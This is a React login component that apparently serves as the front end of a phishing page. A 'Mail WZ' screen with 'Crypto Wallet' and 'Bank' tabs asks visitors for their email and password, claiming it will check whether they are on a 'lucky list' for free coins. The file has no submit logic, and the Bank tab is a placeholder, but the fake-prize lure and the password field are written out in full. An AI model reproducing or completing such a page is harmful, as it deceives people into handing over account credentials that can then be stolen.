import { useEffect } from "react";
import {
    Input,
    Ripple,
    Tab,
    initTE,
} from "tw-elements";

const Login = () => {

    useEffect(() => {
        initTE({ Input, Ripple, Tab });
    }, []);

    return (
        <section className="gradient-form h-full bg-neutral-200 dark:bg-neutral-700">
            <div className="container max-w-6xl h-full p-10 mx-auto">
                <div
                    className="g-6 flex h-full flex-wrap items-center justify-center text-neutral-800 dark:text-neutral-200">
                    <div className="w-full">
                        <div
                            className="block rounded-lg bg-white shadow-lg dark:bg-neutral-800">
                            <div className="g-0 lg:flex lg:flex-wrap">
                                <div className="px-4 md:px-0 lg:w-6/12">
                                    <div className="md:mx-6 md:p-12">
                                        <div className="text-center">
                                            <img
                                                className="mx-auto w-48"
                                                src="https://tecdn.b-cdn.net/img/Photos/new-templates/bootstrap-login-form/lotus.webp"
                                                alt="logo" />
                                            <h4 className="mb-12 mt-1 pb-1 text-xl font-semibold">
                                                Mail WZ
                                            </h4>
                                        </div>
                                        <ul
                                            className="mb-5 flex list-none flex-col flex-wrap pl-0 md:flex-row"
                                            id="pills-tab"
                                            role="tablist"
                                            data-te-nav-ref>
                                            <li role="presentation">
                                                <a
                                                    href="#pills-home"
                                                    className="my-2 block rounded bg-neutral-100 px-7 pb-3.5 pt-4 text-xs font-medium uppercase leading-tight text-neutral-500 data-[te-nav-active]:!bg-primary-100 data-[te-nav-active]:text-primary-700 dark:bg-neutral-700 dark:text-white dark:data-[te-nav-active]:text-primary-700 md:mr-4"
                                                    id="pills-home-tab"
                                                    data-te-toggle="pill"
                                                    data-te-target="#pills-home"
                                                    data-te-nav-active
                                                    role="tab"
                                                    aria-controls="pills-home"
                                                    aria-selected="true"
                                                >Crypto Wallet</a
                                                >
                                            </li>
                                            <li role="presentation">
                                                <a
                                                    href="#pills-profile"
                                                    className="my-2 block rounded bg-neutral-100 px-7 pb-3.5 pt-4 text-xs font-medium uppercase leading-tight text-neutral-500 data-[te-nav-active]:!bg-primary-100 data-[te-nav-active]:text-primary-700 dark:bg-neutral-700 dark:text-white dark:data-[te-nav-active]:text-primary-700 md:mr-4"
                                                    id="pills-profile-tab"
                                                    data-te-toggle="pill"
                                                    data-te-target="#pills-profile"
                                                    role="tab"
                                                    aria-controls="pills-profile"
                                                    aria-selected="false"
                                                >Bank</a
                                                >
                                            </li>
                                        </ul>

                                        <div className="mb-6">
                                            <div
                                                className="hidden opacity-100 transition-opacity duration-150 ease-linear data-[te-tab-active]:block"
                                                id="pills-home"
                                                role="tabpanel"
                                                aria-labelledby="pills-home-tab"
                                                data-te-tab-active>
                                                <form>
                                                    <p class="mb-4">To check if your email in the winning list fill correct Email and click Proceed to the next step.</p>
                                                    <div class="relative mb-4" data-te-input-wrapper-init>
                                                        <input
                                                            type="email"
                                                            class="peer block min-h-[auto] w-full rounded border-0 bg-transparent px-3 py-[0.32rem] leading-[1.6] outline-none transition-all duration-200 ease-linear focus:placeholder:opacity-100 data-[te-input-state-active]:placeholder:opacity-100 motion-reduce:transition-none dark:placeholder:text-neutral-200 [&:not([data-te-input-placeholder-active])]:placeholder:opacity-0"
                                                            id="exampleFormControlInput1"
                                                            placeholder="Email" />
                                                        <label
                                                            for="exampleFormControlInput1"
                                                            class="pointer-events-none absolute left-3 top-0 mb-0 max-w-[90%] origin-[0_0] truncate pt-[0.37rem] leading-[1.6] text-neutral-500 transition-all duration-200 ease-out peer-focus:-translate-y-[0.9rem] peer-focus:scale-[0.8] peer-focus:text-primary peer-data-[te-input-state-active]:-translate-y-[0.9rem] peer-data-[te-input-state-active]:scale-[0.8] motion-reduce:transition-none dark:text-neutral-200 dark:peer-focus:text-primary"
                                                        >Email
                                                        </label>
                                                    </div>

                                                    <div class="relative mb-4" data-te-input-wrapper-init>
                                                        <input
                                                            type="password"
                                                            class="peer block min-h-[auto] w-full rounded border-0 bg-transparent px-3 py-[0.32rem] leading-[1.6] outline-none transition-all duration-200 ease-linear focus:placeholder:opacity-100 data-[te-input-state-active]:placeholder:opacity-100 motion-reduce:transition-none dark:placeholder:text-neutral-200 [&:not([data-te-input-placeholder-active])]:placeholder:opacity-0"
                                                            id="exampleFormControlInput11"
                                                            placeholder="Password" />
                                                        <label
                                                            for="exampleFormControlInput11"
                                                            class="pointer-events-none absolute left-3 top-0 mb-0 max-w-[90%] origin-[0_0] truncate pt-[0.37rem] leading-[1.6] text-neutral-500 transition-all duration-200 ease-out peer-focus:-translate-y-[0.9rem] peer-focus:scale-[0.8] peer-focus:text-primary peer-data-[te-input-state-active]:-translate-y-[0.9rem] peer-data-[te-input-state-active]:scale-[0.8] motion-reduce:transition-none dark:text-neutral-200 dark:peer-focus:text-primary"
                                                        >Password
                                                        </label>
                                                    </div>

                                                    <div class="mb-12 pb-1 pt-1 text-center">
                                                        <button
                                                            class="mb-3 inline-block w-full rounded px-6 pb-2 pt-2.5 text-xs font-medium uppercase leading-normal text-white shadow-[0_4px_9px_-4px_rgba(0,0,0,0.2)] transition duration-150 ease-in-out hover:shadow-[0_8px_9px_-4px_rgba(0,0,0,0.1),0_4px_18px_0_rgba(0,0,0,0.2)] focus:shadow-[0_8px_9px_-4px_rgba(0,0,0,0.1),0_4px_18px_0_rgba(0,0,0,0.2)] focus:outline-none focus:ring-0 active:shadow-[0_8px_9px_-4px_rgba(0,0,0,0.1),0_4px_18px_0_rgba(0,0,0,0.2)]"
                                                            type="button"
                                                            data-te-ripple-init
                                                            data-te-ripple-color="light"
                                                            style={{ background: 'linear-gradient(to right, #ee7724, #d8363a, #dd3675, #b44593)' }}>
                                                            Click to Next Step
                                                        </button>

                                                    </div>
                                                </form>
                                            </div>
                                            <div
                                                className="hidden opacity-0 transition-opacity duration-150 ease-linear data-[te-tab-active]:block"
                                                id="pills-profile"
                                                role="tabpanel"
                                                aria-labelledby="pills-profile-tab">
                                                Tab 2 content
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div
                                    className="flex items-center rounded-b-lg lg:w-6/12 lg:rounded-r-lg lg:rounded-bl-none"
                                    style={{ background: 'linear-gradient(to right, #ee7724, #d8363a, #dd3675, #b44593)' }}>
                                    <div className="px-4 py-6 text-white md:mx-6 md:p-12">
                                        <h4 className="mb-6 text-xl font-semibold">
                                            We are more than just a company
                                        </h4>
                                        <p className="text-sm">
                                            Check if your email is in the lucky list to win 100 Mail WZ free coins
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    )
}

export default Login;